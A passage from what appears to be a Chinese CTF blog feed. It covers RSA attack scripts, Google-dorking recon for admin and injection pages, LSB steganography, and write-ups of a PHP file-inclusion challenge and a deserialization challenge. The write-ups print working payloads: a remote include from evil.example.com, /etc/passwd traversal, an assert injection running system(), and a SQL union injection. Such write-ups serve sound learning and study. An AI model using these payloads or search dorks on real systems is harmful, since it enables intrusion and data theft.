main():n=16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309e=65537d=9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453getpq(n,e,d)if __name__ == &apos;__main__&apos;:main()</code></pre><h3 id="Wiener’s-Attack"><a href="#Wiener’s-Attack" class="headerlink" title="Wiener’s Attack"></a>Wiener’s Attack</h3><p>当d比较小时，攻击者可以使用该攻击获取私钥。</p><pre><code>#coding:utf-8from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5import base64flag=raw_input(&apos;flag:&apos;)key=RSA.construct((1063045321283844468344531168992778520651192162100948533991539097447031440090068191835838938460807260866872379834796862916118785271062209281267667069640000501698142693389209275376843382863579650119977059768375028586326490055087394631528241983631462471709913758728591459476799115050977493979613545056736162868049L, 837165022918376318972691589160491375229372195625940137121740685432530132860541010174727630660292946071507342455170833392895060048564125597915757582027572284342507277083636059558106672685400173531425920294781499112027917632497954958437660357575400222692979844873372105801998210845285775146263117399191185379347L))cipher = Cipher_pkcs1_v1_5.new(key)cipher_text = base64.b64encode(cipher.encrypt(flag))print cipher_text#cipher_text = &apos;AGgt1h6dudnkeoCr7SFclkYYsYa65KZ8V29bbgbf+BDyjnyx5stCYjcyktat73aHs2EOaMgwGUwj3HwPTvT+T5LHIxM4uTnAgWOui4dnb7vF7QizN0ShY2O1h26CgLnf5I0vQWbY7WCC7kA/orNW7F5yxZiKRAawacS2M5ghP4/Q&apos;</code></pre><p>N,e都很大，使用脚本攻击<a href="https://github.com/pablocelayes/rsa-wiener-attack">https://github.com/pablocelayes/rsa-wiener-attack</a></p><h3 id="模不互素"><a href="#模不互素" class="headerlink" title="模不互素"></a>模不互素</h3><p>2019强网杯后来的qwxf题</p><pre><code>flag=open(&quot;flag&quot;,&quot;rb&quot;).read()from Crypto.Util.number import getPrime,bytes_to_longp=getPrime(1024)q=getPrime(1024)e=65537n=p*qm=bytes_to_long(flag)c=pow(m,e,n)print c,e,np=getPrime(1024)e=65537n=p*qm=bytes_to_long(&quot;1&quot;*32)c=pow(m,e,n)print c,e,noutput:2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597 65537 1496703005997511495029539987418504705373658788012799054203576520142577934243066251776506325878468586810706678947574718024471135264646977673293854464158384231379187298635750446218492407522743349863142328918798835147566678519085421038958759497545606498461199046112668430108624153291526731167516419021347424531101962365486593785165353287096542347455534823985802155158965016960243942384116069879333811520423814008573868088331343357406024360002850060082462435847340305959759389141217939916581362251290126338029956101962474148877936701938977578654729206535288500722423958177697589238536444644618564293913728751994597480772738290600395720427374966791868810679503289561331636299088723481081601295504376976771505994839239257982243281755944832179388335202200872303034701385259704689155111113203961854825647839754353463544400357769097811584076360449864038198406483796096300393488954150457232088436311912521426006676078074799541944472370610806183707876727203447414135379759221848593334321977665801505344570011967656216786599521080105962732442308123271827863297608440371497195872696321335951492940674909556448934027087202841797150021492240689288286565153264468817912286380085728893315119450429113729150038055054120991029540732990109518969553624706553714624662628725820618622370803948630854094687814338334827462870357582795291844925274690253604919535785934208081825425541536057550227048399837243392490762167733083030368221240764693694321150104306044125934201699430146970466657410999261630825931178731857267599750324918610790098952520113593130245010530961350592735239454337631927669542026935873535964487595433984902529960726655481696404006628917922241666148082741874033756970724357470539589848548704573091633917869387239324447730587545472564561496724882799495186768858324490838169123077051890332313671220385830444331578674338014080959653201802476516237464651809255679979</code></pre><p>这里的N大到没法分解，但是两个N有公因数，就是p，通过求最大公因数得到p</p><pre><code>def gcd(a, b):if a &lt; b:    a, b = b, awhile b != 0:    temp = a % b    #print temp    a = b    b = tempreturn a</code></pre><p>之后也是常规解密</p><p>再来个网上找的全套的</p><pre><code>#  coding: utf-8from Crypto.PublicKey import RSAimport gmpy2import codecsn1=18263905851567773440446838695766097054252159817375942220432646590577605535001102705343902666589196712209131000424743250389209817386462242094905266578654348699073317748484503797678183012090375022172700739930717847219593096973008967105897376613550069563133191469825170677181620033104899474861544205137427444083416158205978241738189319430709815369614381957092634679663073529915011800029514945250518582469896694087993939399022631417819581576165949892810231692555896017395242464371112868608767990194529216988324463096379599680586615395063392235579858007086701467453321499203151052012397135583838714605379937464734426058203n2=16950818485762084795193828768953323876388698051219062552262211712110062204954209462306530235388240321343855913666709750794055992220667151032536667937762799073479211925880106492191394846770654371623007051501782616639485222511300384032213459590408774089539345780246233268007572472533774114330568959631749390932599046733958624832563792588926026242133422467392689761450865841250657088270966077177543599222351800102728976845282712937106806976091210265560260177661816495238213887970556095475226646345568545415814035277834069152282458515989066082948101449829801979628039212597995349260855092279108102204886522855975419755219c1=16274856857661787783089247952446020386301296490309822420733326939579521159181274564159881569720941773424141684911497028248685883897404191432880449283023146073930043226457053587418510143359803678057561120305169670182063356905346792409675959838228170818653485027257264058185367161472527834396804757004371950225319647551718070122431050642186905590213972232201966833949845104276760241004644118590467546314025479853604227295841523010158969804175921406672115195772809154058842429049437301440993794765038365224477229612151404063782303298937771968709567577283974551173044172598459482531433545960749147311254443274915272200560c2=9946468920119252596998213656931348575944985856629754429330209121534145245119561878513995066589817036899299533093751237144960328759208855732474853794711347203865156360078772132790431594811682581926722057546683437873159107885652842304739962490836998123152090675606004046425633751397173768982047965656687448847259753864171018963561303276197312504508548802813909914926514763930195218396740593919987596462341469781868335025782329081775818968846955110510048099746584203570892950955431181639182647914240604278151551608856971433512600491550082244566145491335738112881861092354219766862656988674738232228115996349755982641605e1=1804229351e2=17249876309q=gmpy2.gcd(n1,n2)p1=n1//qp2=n2//qd1=gmpy2.invert(e1,(p1-1)*(q-1))d2=gmpy2.invert(e2,(p2-1)*(q-1))while d1&lt;0:        d1+=(p1-1)*(q-1)while d2&lt;0:        d2+=(p2-1)*(q-1)m2=hex(pow(c2,d2,n2))[2:].replace(&quot;L&quot;,&quot;&quot;)m1=hex(pow(c1,d1,n1))[2:].replace(&quot;L&quot;,&quot;&quot;)if(len(m2)%2==1):        m2=&apos;0&apos;+m2if(len(m1)%2==1):    m1 =&apos;0&apos;+ m1print m1.decode(&apos;hex&apos;)print m2.decode(&apos;hex&apos;)</code></pre><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><p>当两个用户使用相同的模数 N、不同的私钥时，加密同一明文消息时即存在共模攻击。</p><pre><code>import gmpy2n = 6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249e1 = 773e2 = 839message1 = 3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349message2 = 5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535# s &amp; tgcd, s, t = gmpy2.gcdext(e1, e2)if s &lt; 0:       s = -s    message1 = gmpy2.invert(message1, n)if t &lt; 0:       t = -t    message2 = gmpy2.invert(message2, n)plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % nprint plain</code></pre><h3 id="小公钥指数攻击"><a href="#小公钥指数攻击" class="headerlink" title="小公钥指数攻击"></a>小公钥指数攻击</h3><p>e=3时</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-信息收集</title>
      <link href="/2018/03/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2018/03/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>Google-hacking</p><a id="more"></a><h1 id="渗透测试-信息收集"><a href="#渗透测试-信息收集" class="headerlink" title="渗透测试-信息收集"></a>渗透测试-信息收集</h1><h2 id="0x0-Google-hacking"><a href="#0x0-Google-hacking" class="headerlink" title="0x0 Google-hacking"></a>0x0 Google-hacking</h2><h3 id="常用GoogleHacking语法"><a href="#常用GoogleHacking语法" class="headerlink" title="常用GoogleHacking语法"></a>常用GoogleHacking语法</h3><ul><li>intext:(only google)把网页中的正文内容中的某个字符作为搜索条件</li><li>intitle:把网页标题中的某个字符作为搜索的条件</li><li>cache：搜索搜索引擎里关于某些内容的缓存，可能胡会在过期内容中发现有价值信息</li><li>filetype:指定文件格式</li><li>inurl:搜索包含指定字符的url</li><li>site:在指定站点搜索相关内容</li></ul><h3 id="其他语法"><a href="#其他语法" class="headerlink" title="其他语法"></a>其他语法</h3><ol><li>引号””:把关键字打上引号后把引号作为整体来搜索。</li><li>or：同时搜索两个或者更多关键字。</li><li>link：搜索某个网站的链接。</li></ol><h3 id="典型用法"><a href="#典型用法" class="headerlink" title="典型用法"></a>典型用法</h3><ol><li><p>找管理后台地址：</p><p> site:xxx.com intext:管理|后台|登录|用户名|密码|系统|账号</p><p> site:xxx.com inurl:login|admin|manage|manager|admin_login|system</p><p> site:Xxx.com intitle:管理|后台|登录</p></li><li><p>找上传类漏洞地址</p><p> site:xxx.com inurl:file</p><p> site:xxx.com inurl:upload</p></li><li><p>找注入页面</p><p> site:xxx.com inurl:php?id=</p></li><li><p>找编辑器页面</p><p> site:xxx.com inurl:ewebeditor<br>##0x1 通过目标站点收集信息 ##</p></li></ol><h3 id="使用站长工具对目标站点进行信息收集"><a href="#使用站长工具对目标站点进行信息收集" class="headerlink" title="使用站长工具对目标站点进行信息收集"></a>使用站长工具对目标站点进行信息收集</h3><ol><li>IP查询</li><li>同IP查询</li><li>WHOIS查询和反查</li><li>子域名查询</li><li>识别服务器类型，页面类型</li><li>DNS信息查询</li><li>网站安全检测</li><li>端口扫描<h2 id="0x2漏洞信息收集"><a href="#0x2漏洞信息收集" class="headerlink" title="0x2漏洞信息收集"></a>0x2漏洞信息收集</h2><h3 id="常用漏洞平台"><a href="#常用漏洞平台" class="headerlink" title="常用漏洞平台"></a>常用漏洞平台</h3></li><li>乌云</li><li>360补天漏洞平台</li><li>Exploit-DB</li><li>GHDB</li><li>CVE中文漏洞信息库</li><li>中国国家信息安全漏洞库</li><li>国家信息安全漏洞共享平台<h3 id="漏洞库搜索方式"><a href="#漏洞库搜索方式" class="headerlink" title="漏洞库搜索方式"></a>漏洞库搜索方式</h3></li><li>搜索对应厂商</li><li>搜索对应平台<h3 id="信息收集的目标"><a href="#信息收集的目标" class="headerlink" title="信息收集的目标"></a>信息收集的目标</h3></li><li>已有的渗透过程</li><li>目标的技术架构</li><li>目标使用架构的公开漏洞</li><li>目标可能进行的修复<br>##0x3 使用工具搜索信息 ##<h3 id="常用DOS命令"><a href="#常用DOS命令" class="headerlink" title="常用DOS命令"></a>常用DOS命令</h3></li><li>ping：网络联通测试</li><li>arp：显示和修改地址解析协议</li><li>tracert：显示路由</li><li>nslookup：域名系统查询</li><li>telnet: 测试是否开启远程连接</li><li>netstat：查看本地机器开放所有端口</li><li>nbtstat：获取NetBIOS信息</li><li>ftp: 测试开放了ftp的远程主机</li><li>net：最重要命令，需要掌握子命令<h3 id="常用扫描工具"><a href="#常用扫描工具" class="headerlink" title="常用扫描工具"></a>常用扫描工具</h3></li></ol><ol><li>AWVS</li><li>Appscan</li><li>Zenmap</li><li>御剑系列</li><li>Maltego </li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LSB图片隐写</title>
      <link href="/2018/03/23/LSB%E9%9A%90%E5%86%99/"/>
      <url>/2018/03/23/LSB%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<p>图片隐写题老是一头雾水，借着DD的地铁来学一下吧</p><a id="more"></a><h2 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h2><p>利用图像中的最低有效位进行数据存储。</p><p><img src="https://i.imgur.com/GQM4keP.png" alt="RGB构成"></p><p>一般来说这种隐写都是用BMP图片，不经过压缩，所有的像素都原样存储。png图片有压缩但是却是无损压缩，所以修改的信息也可以正确表达，jpg图片进行压缩之后隐藏的信息可能会被破坏。<br>像素一般由RGB三原色组成，每种颜色占8位，取值为0x00~0xFF,共256种颜色，包含256的3次方种颜色，即16777216种。而人眼大约只能区分1000万种。<br>LSB隐写就是修改RGB颜色分量的最低有效位，每个像素可以携带3比特的信息。</p><p><img src="https://i.imgur.com/jHssNqf.png" alt></p><p>修改绿色的二进制最低位，颜色几乎没有变化，实现信息隐写。</p><p><img src="https://i.imgur.com/ENiocXR.png" alt></p><p><img src="https://i.imgur.com/IHphbX3.png" alt></p><h2 id="来看DD这道题"><a href="#来看DD这道题" class="headerlink" title="来看DD这道题"></a>来看DD这道题</h2><p>给了一张位图，是北京的地铁图。</p><p><img src="https://i.imgur.com/f8eaJYG.png" alt></p><p>尝试LSB，查看低位信息。得到一串密文。</p><p><img src="https://i.imgur.com/04P5AzP.png" alt></p><p>提示是AES，缺少key<br>异或查看图片有两处不同</p><p><img src="https://i.imgur.com/93KEfF7.png" alt></p><p><img src="https://i.imgur.com/NRCfUQe.png" alt></p><p>提示密钥为小写字母，尝试解密就得到了flag.</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LSB </tag>
            
            <tag> MISC </tag>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAW CTF 2016 mfw Writeup</title>
      <link href="/2018/03/23/CSAW-CTF-2016-mfw-Writeup/"/>
      <url>/2018/03/23/CSAW-CTF-2016-mfw-Writeup/</url>
      
        <content type="html"><![CDATA[<p>i cant input chinese,so,here is my poor english !</p><a id="more"></a><h1 id="CSAW-CTF-2016-mfw-Writeup"><a href="#CSAW-CTF-2016-mfw-Writeup" class="headerlink" title="CSAW CTF 2016 mfw Writeup"></a>CSAW CTF 2016 mfw Writeup</h1><h2 id="0x01-需要知道的"><a href="#0x01-需要知道的" class="headerlink" title="0x01 需要知道的"></a>0x01 需要知道的</h2><ol><li>本地文件包含</li><li>git源码泄露<h2 id="0x02-本地文件包含"><a href="#0x02-本地文件包含" class="headerlink" title="0x02 本地文件包含"></a>0x02 本地文件包含</h2>来自维基百科的解释：</li></ol><p>In PHP the main cause is due to the use of unvalidated user-input with a filesystem function that includes a file for execution.</p><hr><p>** most notable are the include and require statements.**</p><hr><p>Most of the vulnerabilities can be attributed to novice programmers not being familiar with all of the capabilities of the PHP programming language. The PHP language has a directive which, if enabled,</p><hr><p>** allows filesystem functions to use a URL to retrieve data from remote locations**.[1]</p><hr><p> The directive is allow_url_fopen in PHP versions &lt;= 4.3.4 and allow_url_include since PHP 5.2.0. In PHP 5.x this directive is disabled by default, in prior versions it was enabled by default.[2] To exploit the vulnerability an attacker will alter a variable that is passed to one of these functions to cause it to include malicious code from a remote resource.</p><hr><p>** To mitigate this vulnerability all user input needs to be validated before being used.**</p><p>大体意思就是说使用了 include 和 require 的代码可能会因为代码的质量不好，没有对传入的变量进行检测，导致允许远程主机使用URL里的恶意代码从文件系统里获取到敏感文件信息。</p><p>Example：</p><pre><code>&lt;?php   if ( isset( $_GET[&apos;language&apos;] ) ) {  include( $_GET[&apos;language&apos;] . &apos;.php&apos; );   }?&gt;&lt;form method=&quot;get&quot;&gt;   &lt;select name=&quot;language&quot;&gt;      &lt;option value=&quot;english&quot;&gt;English&lt;/option&gt;      &lt;option value=&quot;french&quot;&gt;French&lt;/option&gt;      ...   &lt;/select&gt;   &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;</code></pre><p>以下是payload:</p><pre><code>/vulnerable.php?language=http://evil.example.com/webshell.txt? - injects a remotely hosted file containing a malicious code (remote file include)/vulnerable.php?language=C:\\ftp\\upload\\exploit - Executes code from an already uploaded file called exploit.php (local file inclusion vulnerability)/vulnerable.php?language=C:\\notes.txt%00 - example using NULL meta character to remove the .php suffix, allowing access to files other than .php. This use of null byte injection was patched in PHP 5.3, and can no longer be used for LFI/RFI attacks.[5]/vulnerable.php?language=../../../../../etc/passwd%00 - allows an attacker to read the contents of the /etc/passwd file on a Unix system through a directory traversal attack.</code></pre><h2 id="0x03-git源码泄露"><a href="#0x03-git源码泄露" class="headerlink" title="0x03 git源码泄露"></a>0x03 git源码泄露</h2><p>使用git在初始化代码库的时候，会在当前目录下产生一个.git的隐藏目录，用来记录代码的变更等。同时使用这个文件可以恢复各个版本的代码，所以如果.git文件可以访问，就可能泄露了源代码。</p><h2 id="0x04-题目"><a href="#0x04-题目" class="headerlink" title="0x04 题目"></a>0x04 题目</h2><p><img src="https://i.imgur.com/1cGM2Pl.png" alt></p><p>查看源码，发现可能的漏洞</p><p><img src="https://i.imgur.com/Qutnt0L.png" alt></p><p>于是我们尝试用文件包含来获取密码信息</p><pre><code>http://111.198.29.45:31930/?page=../../../../../etc/passwd</code></pre><p>发现被过滤了。flag页面可能作为隐藏变量了。</p><p>看到about页面说使用了git</p><p><img src="https://i.imgur.com/qHNE2ot.png" alt></p><p>想到.git源码泄露，访问.git文件，发现可以访问</p><p><img src="https://i.imgur.com/V87suOa.png" alt></p><p>我们使用 工具GitHack将网站源码clone下来。</p><blockquote><p><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p></blockquote><p>GitHack的工作原理是</p><blockquote><p>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。<br>渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等web安全漏洞。</p></blockquote><p>使用命令：</p><pre><code>&gt;python2 GitHack.py http://111.198.29.45:31930/.git/</code></pre><p>在flag.php文件中只有：</p><pre><code>&lt;?php// TODO// $FLAG = &apos;&apos;;?&gt;</code></pre><p>没什么帮助，去index.php里查看：</p><pre><code>&lt;?phpif (isset($_GET[&apos;page&apos;])) {$page = $_GET[&apos;page&apos;];} else {    $page = &quot;home&quot;;}$file = &quot;templates/&quot; . $page . &quot;.php&quot;;// I heard &apos;..&apos; is dangerous!assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);// TODO: Make this look niceassert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);?&gt;</code></pre><p>这里需要注意的是出现的这几个函数</p><p>strops:<br>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE.</p><p>assert:*<em>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。<br>*</em></p><p>又看到代码对输入的page变量没有检测，这就是说我们有机会对其改造，使其执行系统命令。<br>下面是大神的payload:</p><pre><code>flag&apos;,&apos;..&apos;)+or+system(&apos;cat+templates/flag.php&apos;);//</code></pre><p>注意到assert语句里的strops是单引号，我们就将其闭合，并执行系统命令获取flag.php文件内容，同时将后面的die语句注释掉。</p><p>大神就是大神！</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HITCON-babytrick</title>
      <link href="/2018/03/23/HITCON-Babytrick/"/>
      <url>/2018/03/23/HITCON-Babytrick/</url>
      
        <content type="html"><![CDATA[<p>too hard</p><a id="more"></a><h1 id="HITCON-babytrick"><a href="#HITCON-babytrick" class="headerlink" title="HITCON-babytrick"></a>HITCON-babytrick</h1><p>##0x01 需要注意的点 ##</p><ul><li>php反序列化</li><li>简单的注入</li><li>字符集绕过</li></ul><h2 id="0x02-源码分析"><a href="#0x02-源码分析" class="headerlink" title="0x02 源码分析"></a>0x02 源码分析</h2><pre><code>index.php源码&lt;?phpinclude &quot;config.php&quot;;class HITCON{private $method;private $args;private $conn;public function __construct($method, $args) {    $this-&gt;method = $method;    $this-&gt;args = $args;    $this-&gt;__conn();}function show() {    list($username) = func_get_args();    $sql = sprintf(&quot;SELECT * FROM users WHERE username=&apos;%s&apos;&quot;, $username);    $obj = $this-&gt;__query($sql);    if ( $obj != false  ) {        $this-&gt;__die( sprintf(&quot;%s is %s&quot;, $obj-&gt;username, $obj-&gt;role) );    } else {        $this-&gt;__die(&quot;Nobody Nobody But You!&quot;);    }}function login() {    global $FLAG;    list($username, $password) = func_get_args();    $username = strtolower(trim(mysql_escape_string($username)));    $password = strtolower(trim(mysql_escape_string($password)));    $sql = sprintf(&quot;SELECT * FROM users WHERE username=&apos;%s&apos; AND password=&apos;%s&apos;&quot;, $username, $password);    if ( $username == &apos;orange&apos; || stripos($sql, &apos;orange&apos;) != false ) {        $this-&gt;__die(&quot;Orange is so shy. He do not want to see you.&quot;);    }    $obj = $this-&gt;__query($sql);    if ( $obj != false &amp;&amp; $obj-&gt;role == &apos;admin&apos;  ) {        $this-&gt;__die(&quot;Hi, Orange! Here is your flag: &quot; . $FLAG);    } else {        $this-&gt;__die(&quot;Admin only!&quot;);    }}function source() {    highlight_file(__FILE__);}function __conn() {    global $db_host, $db_name, $db_user, $db_pass, $DEBUG;    if (!$this-&gt;conn)        $this-&gt;conn = mysql_connect($db_host, $db_user, $db_pass);    mysql_select_db($db_name, $this-&gt;conn);    if ($DEBUG) {        $sql = &quot;CREATE TABLE IF NOT EXISTS users (                     username VARCHAR(64),                     password VARCHAR(64),                     role VARCHAR(64)                ) CHARACTER SET utf8&quot;;        $this-&gt;__query($sql, $back=false);        $sql = &quot;INSERT INTO users VALUES (&apos;orange&apos;, &apos;$db_pass&apos;, &apos;admin&apos;), (&apos;phddaa&apos;, &apos;ddaa&apos;, &apos;user&apos;)&quot;;        $this-&gt;__query($sql, $back=false);    }     mysql_query(&quot;SET names utf8&quot;);    mysql_query(&quot;SET sql_mode = &apos;strict_all_tables&apos;&quot;);}function __query($sql, $back=true) {    $result = @mysql_query($sql);    if ($back) {        return @mysql_fetch_object($result);    }}function __die($msg) {    $this-&gt;__close();    header(&quot;Content-Type: application/json&quot;);    die( json_encode( array(&quot;msg&quot;=&gt; $msg) ) );}function __close() {    mysql_close($this-&gt;conn);}function __destruct() {    $this-&gt;__conn();    if (in_array($this-&gt;method, array(&quot;show&quot;, &quot;login&quot;, &quot;source&quot;))) {        @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);    } else {        $this-&gt;__die(&quot;What do you do?&quot;);    }    $this-&gt;__close();}function __wakeup() {    foreach($this-&gt;args as $k =&gt; $v) {        $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));    }}}if(isset($_GET[&quot;data&quot;])) {@unserialize($_GET[&quot;data&quot;]);    } else {new HITCON(&quot;source&quot;, array());}?&gt;下面的是config.php&lt;?php$db_host = &apos;localhost&apos;;$db_name = &apos;babytrick&apos;;$db_user = &apos;babytrick&apos;;$db_pass = &apos;babytrick1234&apos;;$DEBUG = @$_GET[&apos;noggnogg&apos;];$FLAG = &quot;HITCON{php 4nd mysq1 are s0 mag1c, isn&apos;t it?}&quot;;?&gt;</code></pre><p>为了在本地更好的复现，修改了部分config.php代码如下：</p><pre><code>&lt;?php$db_host = &apos;localhost&apos;;$db_name = &apos;test1&apos;;$db_user = &apos;root&apos;;$db_pass = &apos;root&apos;;$DEBUG = @$_GET[&apos;noggnogg&apos;];$FLAG = &quot;HITCON{php 4nd mysq1 are s0 mag1c, isn&apos;t it?}&quot;;?&gt;</code></pre><p>分析源码得到ROP链大致为：get参数-&gt;反序列化-&gt;wakeup()-&gt;destruct()。发现现在出现的函数里没有flag的影子，与FLAG有关的在login()函数里</p><pre><code>    $obj = $this-&gt;__query($sql);if ( $obj != false &amp;&amp; $obj-&gt;role == &apos;admin&apos;  ) {    $this-&gt;__die(&quot;Hi, Orange! Here is your flag: &quot; . $FLAG);} else {    $this-&gt;__die(&quot;Admin only!&quot;);}</code></pre><p>先跟进login()函数查看发现该函数的作用就是将$username和$password带入一条sql语句，在查询之前先进行一次过滤，之后如果查询后的结果满足if判断就可以拿到flag。也就是说我们现在首先要得到username和password的值，再观察代码可以看到conn()函数给出了题目数据库的结构</p><pre><code>+----------+----------+-------+| username | password | role  |+----------+----------+-------+| orange   | $db_pass | admin || phddaa   | ddaa     | user  |+----------+----------+-------+</code></pre><p>也就是说我们现在只剩password不知道了。<br>发现show()函数里对传入的参数没有过滤就带入数据库查询，可以在这里尝试注入得到password。</p><p>现在似乎该知道的都知道了，可是发现跟之前的序列化调用路径没有关系啊ε=ε=ε=┏(゜ロ゜;)┛</p><p>再看代码终于在destruct()里找到了这样的代码</p><pre><code>if (in_array($this-&gt;method, array(&quot;show&quot;, &quot;login&quot;, &quot;source&quot;))) {@call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</code></pre><p>这里限制了$method变量的值必须是这几个中的一种，而这三个又分别对应各自的函数。判断通过后调用回调函数将数组类型的args变量当作参数传入array()中执行method指定的方法。关于回调函数可以参考php_manual的介绍</p><pre><code>&lt;?phpfunction foobar($arg, $arg2) {echo __FUNCTION__, &quot; got $arg and $arg2\n&quot;;}class foo {function bar($arg, $arg2) {    echo __METHOD__, &quot; got $arg and $arg2\n&quot;;}}// Call the foobar() function with 2 argumentscall_user_func_array(&quot;foobar&quot;, array(&quot;one&quot;, &quot;two&quot;));// Call the $foo-&gt;bar() method with 2 arguments$foo = new foo;call_user_func_array(array($foo, &quot;bar&quot;), array(&quot;three&quot;, &quot;four&quot;));?&gt;输出类似于foobar got one and twofoo::bar got three and four</code></pre><p>好的，终于把思路理清楚了新的ROP为：get参数-&gt;反序列化-&gt;wakeup()-&gt;destruct()-&gt;show()-&gt;login().</p><h2 id="0x03开始构造序列化字符串"><a href="#0x03开始构造序列化字符串" class="headerlink" title="0x03开始构造序列化字符串"></a>0x03开始构造序列化字符串</h2><pre><code>class HITCON{private $method;private $args;public function __construct($method, $args) {    $this-&gt;method = $method;    $this-&gt;args = $args;}}$method = &quot;show&quot;;$args = array(&quot;1&apos; union select password,username,role from users where username=&apos;orange&apos; -- &quot;);$a = new HITCON($method,$args);echo serialize($a);  O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:4:&quot;show&quot;;s:12:&quot;%00HITCON%00args&quot;;a:1:{i:0;s:77:&quot;1&apos; union select password,username,role from users where username=&apos;orange&apos; -- &quot;;}}</code></pre><p>这里需要注意的是wake_up()对args进行过滤，因此我们要绕过它，把变量的个数设置大于实际个数就可以，还要注意的是私有变量前后会多两个%00长度也多二。知道这些之后就可以得到password了。</p><pre><code>{&quot;msg&quot;:&quot;root is admin&quot;}</code></pre><p>再进行下一步login()：</p><pre><code>    class HITCON{private $method;private $args;public function __construct($method, $args) {    $this-&gt;method = $method;    $this-&gt;args = $args;}    $method = &quot;login&quot;;$args = array(&apos;orange&apos;,&apos;root&apos;);$b = new HITCON($method,$args);echo serialize($b);O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:5:&quot;login&quot;;s:12:&quot;%00HITCON%00args&quot;;a:2:{i:0;s:6:&quot;orange&quot;;i:1;s:4:&quot;root&quot;;}}</code></pre><p>得到如下结果</p><pre><code>{&quot;msg&quot;:&quot;Orange is so shy. He do not want to see you.&quot;}</code></pre><p>还需要绕过对orange的判断。由于代码中在链接数据库时设置了字符编码为utf8编码，所以尝试字符差异绕过<br>将a替换成Ã、Ä…这里注意替换完之后长度会加一。同理替换e或着其他的字母都行。</p><pre><code>O:6:&quot;HITCON&quot;:3:{s:14:&quot;%00HITCON%00method&quot;;s:5:&quot;login&quot;;s:12:&quot;%00HITCON%00args&quot;;a:2:{i:0;s:7:&quot;orÄnge&quot;;i:1;s:4:&quot;root&quot;;}}</code></pre><p>得到flag</p><pre><code>{&quot;msg&quot;:&quot;Hi, Orange! Here is your flag: HITCON{php 4nd mysq1 are s0 mag1c, isn&apos;t it?}&quot;}</code></pre><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>做题时思路要发散，做题看到反序列化就盯着几个魔法函数不动也不行。</p><p>对于关键的函数一定要好好查查清楚到底啥作用，你问什么是关键函数？一个一个去查手册啊，就像这道题的回调函数，我刚开始看的时候死活找不到怎么把flag和反序列化联系在一起，真的是看的头秃才注意到回调函数/(ㄒoㄒ)/~~。</p><p>构造序列化字符串还不熟，这道题的第二个反序列化做的时候也是没一下想到怎么把username和password传进去，还是自己太菜。</p><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><blockquote><p><a href="https://www.freebuf.com/vuls/116705.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/116705.html</a></p></blockquote><blockquote><p><a href="https://blog.csdn.net/qq_42196196/article/details/81217375" target="_blank" 